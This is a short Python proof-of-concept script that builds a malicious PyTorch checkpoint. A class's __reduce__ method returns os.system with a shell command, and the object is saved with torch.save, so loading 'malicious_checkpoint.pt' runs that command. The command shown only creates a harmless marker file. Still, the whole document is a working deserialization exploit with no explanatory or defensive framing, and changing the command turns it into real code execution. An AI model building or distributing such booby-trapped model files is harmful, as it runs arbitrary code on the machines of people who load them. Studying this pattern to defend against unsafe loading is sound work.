import torch
import os
 
class MaliciousClass:
    def __reduce__(self):
        malicious_command = (os.system, ('touch attack.txt',))
        return malicious_command
 
malicious_obj = MaliciousClass()
torch.save(malicious_obj, 'malicious_checkpoint.pt')
